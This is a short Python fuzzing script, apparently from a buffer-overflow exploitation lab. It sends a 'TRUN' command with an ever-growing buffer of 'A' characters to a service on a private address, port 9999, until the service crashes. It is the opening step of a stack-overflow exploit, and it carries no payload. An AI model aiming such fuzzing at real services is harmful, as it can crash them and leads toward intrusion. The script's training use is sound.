#!/usr/bin/python

import sys
import socket
from time import sleep

buffer = b"A" * 100

ip = "192.168.1.11"
port = 9999

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))

        data = b"TRUN /.:/" + buffer

        s.send((data))
        s.close()

        sleep(1)

        buffer += b"A" * 100

    except socket.error:
        print(f"Fuzzing crashed at {len(buffer)} bytes")
        sys.exit()
